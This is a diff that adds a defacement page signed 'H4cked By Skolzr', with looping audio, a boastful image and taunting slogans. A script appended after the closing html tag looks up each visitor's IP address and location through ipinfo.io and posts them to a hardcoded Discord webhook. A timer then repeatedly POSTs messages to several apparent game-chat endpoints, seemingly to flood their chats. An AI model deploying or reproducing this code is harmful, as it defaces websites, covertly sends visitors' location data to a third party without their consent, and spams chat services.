@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Alert Skolzr on the System</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Iceland&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000000;
+      color: #ffffff;
+      font-family: 'Iceland', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      animation: flicker 2s ease-in-out 1;
+    }
+
+    .container {
+      max-width: 600px;
+      padding: 1rem;
+      margin: auto;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      transform: scale(1.1);
+      transition: transform 0.5s ease;
+      border-radius: 5px;
+    }
+
+    .title {
+      font-size: 2.8rem;
+      margin: 1rem 0;
+      font-weight: normal;
+    }
+
+    .quote {
+      font-size: 1.8rem;
+      margin-top: 0.5rem;
+      color: #ffffff;
+      font-weight: normal;
+    }
+
+    .footer-text {
+      color: #ffffff;
+      margin-top: 2rem;
+      font-size: 1rem;
+      font-weight: normal;
+    }
+
+    @media (max-width: 600px) {
+      .title {
+        font-size: 1.5rem;
+      }
+
+      .quote {
+        font-size: 1rem;
+      }
+    }
+
+    @keyframes flicker {
+      0% { opacity: 0; }
+      10% { opacity: 0.3; }
+      20% { opacity: 1; }
+      30% { opacity: 0.7; }
+      40% { opacity: 1; }
+      100% { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- كود تشغيل الصوت -->
+ <audio autoplay loop>
+        <source src="https://f.top4top.io/m_38975sufb1.mp3" type="audio/mpeg">
+    </audio>
+
+  <div class="container">
+    <a href="https://i.ibb.co/JR65rjqJ/Screenshot-2026-08-26-051257.png">
+      <img src="https://i.ibb.co/JR65rjqJ/Screenshot-2026-08-26-051257.png" alt="Saudi Falcons Image" />
+    </a>
+
+    <div class="title">
+      H4cked By Skolzr
+    </div>
+
+    <div class="quote">
+      “Your defenses were just an illusion. We are everywhere.”
+    </div>
+
+    <div class="quote">
+      “SKOLZR HACKED THE SYSTEM”
+    </div>
+    </div>
+  </div>
+</body>
+</html>
+<div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text">Your IP INFO Was Hacked By "Skolzr"</div>
+
+    <script>
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = `<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
+
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1553850953910853744/luQNNARwPLbTOtdJbykkuk4KFZtB4lo3PWmfpH2BHNGUpX9uQKviZ-SGEZ6-h5YXvR79';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\nTimezone : ${timezone} \nRegion : ${region}\nLocation : ${loc}\nOrganization : ${org}`})
+            });
+        });
+
+   
+const msg = ``;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
+</body>
+</html>
